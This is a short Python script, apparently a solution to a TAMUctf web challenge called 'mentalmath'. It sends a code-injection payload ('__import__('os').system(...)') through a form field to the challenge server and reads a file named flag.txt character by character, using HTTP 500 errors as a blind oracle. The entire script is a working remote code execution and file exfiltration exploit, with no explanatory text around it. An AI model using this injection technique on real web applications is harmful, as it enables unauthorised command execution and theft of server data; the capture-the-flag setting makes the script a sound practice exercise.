import requests

brute_list = "{_}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
for i in range(0, 150):  # big enough to extract the flag fully
    for x in brute_list:
        payload = "4 % __import__('os').system('cat flag.txt | cut -c "+str(i)+" | grep "+x+"')#"

        a = requests.post("http://mentalmath.tamuctf.com/ajax/new_problem", data={'problem': payload, 'answer': "2"})
        if a.status_code == 500:
            y = x
            if y == "}":
                exit(0)
            print(x, end="")
            break


